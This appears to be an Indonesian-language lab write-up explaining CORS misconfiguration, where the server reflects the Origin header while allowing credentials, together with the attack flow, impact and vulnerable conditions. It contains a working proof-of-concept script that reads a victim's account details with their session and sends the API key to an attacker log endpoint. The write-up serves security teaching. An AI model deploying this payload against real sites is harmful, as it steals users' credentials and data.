# CORS Misconfiguration (Origin Reflection) → Exploiting Credentialed Cross-Origin Data Access

---

## Pengertian

CORS vulnerability ini terjadi ketika server **secara tidak aman merefleksikan Origin** dan mengizinkan akses lintas domain dengan:

* `Access-Control-Allow-Origin` yang dinamis (reflected origin)
* `Access-Control-Allow-Credentials: true`

Kombinasi ini memungkinkan attacker untuk **mengakses data sensitif dari request authenticated user** melalui browser korban.

---

## Inti Masalah

Konfigurasi CORS yang lemah biasanya muncul ketika:

* Server tidak memvalidasi Origin dengan ketat
* Origin dari request langsung dimasukkan ke response header
* Credentialed request diizinkan (`withCredentials = true`)

Akibatnya:

> Attacker bisa membaca response API korban dari browser korban sendiri.

---

## Mekanisme Serangan

Alur eksploitasi:

1. Korban login ke aplikasi target
2. Browser korban memiliki session aktif (cookie/token)
3. Attacker mengirim link exploit
4. Script di browser korban melakukan request cross-origin
5. Server mengizinkan request karena Origin dianggap valid
6. Response sensitif (API key / data akun) dibaca oleh attacker

---

## Contoh Payload Exploit (PoC)

```html
<script>
var req = new XMLHttpRequest();
req.onload = function () {
    location = '/log?key=' + encodeURIComponent(this.responseText);
};

req.open(
    'GET',
    'https://YOUR-LAB-ID.web-security-academy.net/accountDetails',
    true
);

req.withCredentials = true;
req.send();
</script>
```

---

## Kondisi Vulnerability

Vulnerability ini terjadi jika:

* `Access-Control-Allow-Origin` → mencerminkan Origin request
* `Access-Control-Allow-Credentials: true`
* Endpoint mengembalikan data sensitif
* Tidak ada strict whitelist Origin

---

## Dampak Keamanan

Jika berhasil dieksploitasi, dampaknya bisa berupa:

* Account takeover (ATO)
* API key leakage
* Session data exposure
* Unauthorized data access
* Privilege escalation (dalam beberapa kasus)

---

## Kenapa Ini Berbahaya

Karena eksploitasi terjadi di **browser korban**, sehingga:

* Request terlihat legitimate
* Menggunakan session asli korban
* Tidak membutuhkan bypass authentication tambahan

---

## Kesimpulan

Ini adalah kasus klasik:

> **CORS Misconfiguration dengan Origin Reflection + Credentialed Requests**

yang memungkinkan attacker membaca data sensitif dari response API melalui browser korban secara cross-origin.
